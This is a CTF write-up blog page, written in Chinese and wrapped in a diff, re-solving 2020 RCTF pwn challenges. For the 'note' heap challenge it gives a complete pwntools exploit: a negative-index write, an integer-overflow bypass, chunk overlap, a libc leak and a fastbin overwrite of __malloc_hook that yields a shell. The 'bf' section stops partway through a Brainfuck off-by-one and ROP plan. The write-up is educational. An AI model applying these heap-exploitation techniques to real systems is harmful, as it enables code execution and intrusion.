@@ -1,0 +1,1206 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="hurricane618">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="hurricane618">
+    
+    <meta name="keywords" content="hexo,web security,ctf,hurricane618,代码审计,iot">
+    
+    <meta name="description" content="hurricane618's blog">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>2020RCTF 几道pwn题的复现 · 风之栖息地|hurricane618&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/hurricane_favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-121933059-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">风之栖息地</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2020RCTF 几道pwn题的复现</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">风之栖息地</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg1.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2020RCTF 几道pwn题的复现
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ROP">ROP</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.7k</span>阅读时长: <span class="post-count reading-time">21 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/08/01</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>博客长草严重，上半年摸鱼太久。最近趁着有空开始复现之前的一些题目，这次做了2020RCTF的几道pwn题，本来还想着把MIPS那道题做出来再发，结果发现MIPS的调试还有很多问题，所以就先发常规一点的题。</p>
+<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p>最经典的菜单堆题，还是note管理系统。64位程序，保护全开。主要功能有new，sell，show，edit，经典的增删查改，除了基本功能之外，还有两个额外的功能，一个是<code>super note</code>，一个是越界写数据但是只能操作一次。</p>
+<p>这个题的<code>super note</code>是个幌子，最后完全没有用到。它的数据结构是三个部分组成，开头是一个指针指向我们申请的message区域，第二块是size，表示message的大小，第三块是表示money。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+---------------+-----------&gt;+-------------+</span><br><span class="line">|     ptr       |            |             |</span><br><span class="line">|               |            |   message   |</span><br><span class="line">+---------------+            |             |</span><br><span class="line">|     size      |            +-------------+</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br><span class="line">|     money     |</span><br><span class="line">|               |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>
+<h3 id="绕过money的限制"><a href="#绕过money的限制" class="headerlink" title="绕过money的限制"></a>绕过money的限制</h3><p>这里利用了它的index可以为负数的问题，我们可以向前修改数据，并且恰巧在index=-5时ptr的位置处有一个指针，它指向自己地址，同时在它的后面有存储着money的变量地址。这样我们就可以编辑下标为-5的地方，输入我们的值把money变大绕过分配note的限制。</p>
+<p><code>edit(-5,&#39;a&#39;*8 + p64(0xfffffffffffffff) + &#39;\x01&#39;)</code></p>
+<p>由于分配内存需要消耗<code>size*857</code>的钱，出售只能得到<code>size*64</code>的钱，所以这里还有另外一种绕过的方法，利用了寄存器溢出的问题，我们给一个很大的数，这个数<code>n</code>能够满足<code>n*857</code>溢出，<code>n*64</code>不会溢出，这样我们在用<code>money</code>比较<code>n*857</code>就能通过，但是在出售的时候却没有溢出，这个数就会很大，出售得到的钱足够我们使用。</p>
+<p><code>new(0, 21524788884141834) sell(0)</code></p>
+<h3 id="chunk-overlap"><a href="#chunk-overlap" class="headerlink" title="chunk overlap"></a>chunk overlap</h3><p>因为我们有一次越界写的机会，所以能轻松的修改掉chunk的size区域实现overlap。</p>
+<p>由于有tcache的存在，我们需要分配超过<code>small bin</code>大小的chunk释放后才能进入<code>unsorted bin</code>。我们在头部和尾部分配小chunk，头部chunk拿来溢出，尾部chunk为了避免和<code>top chunk</code>合并。溢出修改size之后释放，就会进入<code>unsorted bin</code>，它的<code>fd</code>和<code>bk</code>指针会指向<code>main_arena</code>区域，随后我们分配它原始大小的chunk，这样剩下的部分会移动进overlap的chunk中，这个时候再使用show功能泄露地址，通过<code>main_arena</code>我们可以计算出libc基地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)  <span class="comment"># 0x100</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">once(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x28</span> + p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br></pre></td></tr></table></figure>
+<p>除了使用<code>unsorted bin</code>来泄露地址之外，还可以使用<code>large bin</code>的chunk来泄露地址。</p>
+<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>在知道libc基地址之后，我们剩下的工作就是向<code>__malloc_hook</code>或者<code>__free_hook</code>中写入<code>one_gadget</code>。首先，我们新分配一个大小为0x60的note，这个的chunk会和原来的index=3的note重合，我们再释放index=3的note，为了让它进入<code>fastbin</code>，我们必须要先把<code>tcache</code>塞满7个。释放之后，我们拿新分配的note写入需要伪造的地址，这样我们再次分配两次，第二次就能拿到伪造地址的chunk。</p>
+<p>这个伪造地址也是很讲究的，它的size区域必须要符合fastbin的检查，而为了方便我们一般会写<code>__malloc_hook</code>之前偏移的一部分，通过偏移能够凑出size大小为<code>0x7f</code>，同时我们还能覆盖<code>__realloc_hook</code>。如果我们的one_gadget无法满足条件，那么我们可以在<code>__realloc_hook</code>中写入one_gadget，<code>__malloc_hook</code>中写入<code>__libc_realloc</code>加上一定偏移。这个偏移是决定pop的数量，为了满足条件以此来调整栈的位置。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(fake_addr))</span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">'a'</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>一道<code>chunk overlap</code>+<code>fastbin attack</code>的题目。里面通过调试学到了一个有趣的地方，<code>calloc</code>在分配chunk的时候，不会从tcache中拿chunk，仔细想想<code>calloc</code>在分配的时候会对内存做初始化操作，可能也是因为这个原因所以分配tcache缓存的意义不大。（纯属推测）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./note'</span>)</span><br><span class="line"><span class="comment">#io = remote('124.156.135.103', 6004)</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index, size)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    io.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Message: '</span>)</span><br><span class="line">    io.sendline(message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">once</span><span class="params">(index, message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    io.send(<span class="string">'7'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    io.send(str(index))</span><br><span class="line">    io.recvuntil(<span class="string">'Message: '</span>)</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">0</span>, <span class="number">21524788884141834</span>)</span><br><span class="line">sell(<span class="number">0</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">-5</span>,<span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0xfffffffffffffff</span>) + <span class="string">'\x01'</span>)  <span class="comment"># fill money with 0xfffffffffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    new(i, <span class="number">0x60</span>)</span><br><span class="line">    sell(i)</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>, <span class="number">0x20</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)  <span class="comment"># 0x100</span></span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">4</span>, <span class="number">0x60</span>)  <span class="comment"># 0x70</span></span><br><span class="line">new(<span class="number">5</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">once(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x28</span> + p64(<span class="number">0x461</span>))</span><br><span class="line"></span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>, <span class="number">0x300</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'leak_addr: '</span> + hex(leak_addr))</span><br><span class="line"></span><br><span class="line">main_arena = leak_addr - <span class="number">96</span></span><br><span class="line"><span class="comment"># libc_addr = main_arena - 0x3ebc40</span></span><br><span class="line"><span class="comment"># one_gadget = libc_addr + 0x4f322  # 0x4f2c5 0x10a38c</span></span><br><span class="line"></span><br><span class="line">libc_addr = main_arena - <span class="number">0x1e4c40</span></span><br><span class="line">one_gadget = libc_addr + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'libc: '</span> + hex(libc_addr))</span><br><span class="line">log.info(<span class="string">'malloc_hook: '</span> + hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">fake_addr = malloc_hook - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">sell(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">7</span>, p64(fake_addr))</span><br><span class="line">new(<span class="number">8</span>, <span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">9</span>, <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">'a'</span>*<span class="number">11</span> + p64(one_gadget) + p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line">pause()</span><br><span class="line">new(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="bf"><a href="#bf" class="headerlink" title="bf"></a>bf</h2><p>一道头秃的c++题目，仔细分析代码可以知道我们输入的code会被当做brainfuck代码解析，随后执行。漏洞点出现在移动指针的操作上。</p>
+<img src="/2020/08/01/2020rctf-some-pwn/1.png">
+<p>这里退出的条件是指针大于字符串的地址，忽视了等于的时候，所以可以正好读取或者修改字符串的最低字节。而这个最低字节刚好是字符串结构的一个指针它指向存储数据的buf地址，当字符串的长度小于等于16时会把结构体放在栈上。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">string</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* ptr;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们要做的是覆盖这个指针让它指向其他位置，通过再次写入内容可以完成rop chain。在这之后的这道题限制了<code>execve</code>，所以只能使用orw的方法获取flag。</p>
+<h3 id="泄露stack和libc地址"><a href="#泄露stack和libc地址" class="headerlink" title="泄露stack和libc地址"></a>泄露stack和libc地址</h3><p>首先，我们需要泄露出指针的最低位，因为在最后返回的时候需要把指针最低位还原，不然析构函数会报错。</p>
+<p>输入brainfuck的代码<code>,[.&gt;,]&gt;.</code>，其中<code>,</code>读入一字节写入到当前位置，<code>[]</code>类似于循环如果当前位置的数据不为0则会从<code>]</code>跳回<code>[</code>，<code>.</code>输出当前位置的数据，<code>&gt;</code>指针向前移动一个字节。总结来说，这段代码就是可以不断的读输入直到有<code>\x00</code>出现循环退出，再移动一位输出数据。</p>
+<p>输入这段代码之后，我们输入0x3ff的数据末尾跟着<code>\x00</code>，这样就能移动0x400字节大小读取到string的最低字节。在获得最低字节后会判断这个是否符合我们攻击的要求，因为最低字节过大会让后面写入的rop chain超过可控范围。</p>
